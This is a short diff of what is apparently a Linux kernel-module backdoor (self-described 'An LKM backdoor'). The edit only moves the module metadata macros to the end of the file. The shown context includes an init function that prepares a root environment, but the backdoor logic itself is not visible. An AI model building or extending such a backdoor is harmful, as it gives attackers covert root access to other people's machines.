@@ -3,11 +3,6 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("@Pink_P4nther");
-MODULE_DESCRIPTION("An LKM backdoor");
-MODULE_VERSION("1.0");
-
 static int __init mload(void)
 {
 	char *envp[] = {"HOME=/root","TERM=xterm",NULL};
@@ -25,3 +20,8 @@ static void __exit munload(void)
 
 module_init(mload);
 module_exit(munload);
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("@Pink_P4nther");
+MODULE_DESCRIPTION("An LKM backdoor");
+MODULE_VERSION("1.0");
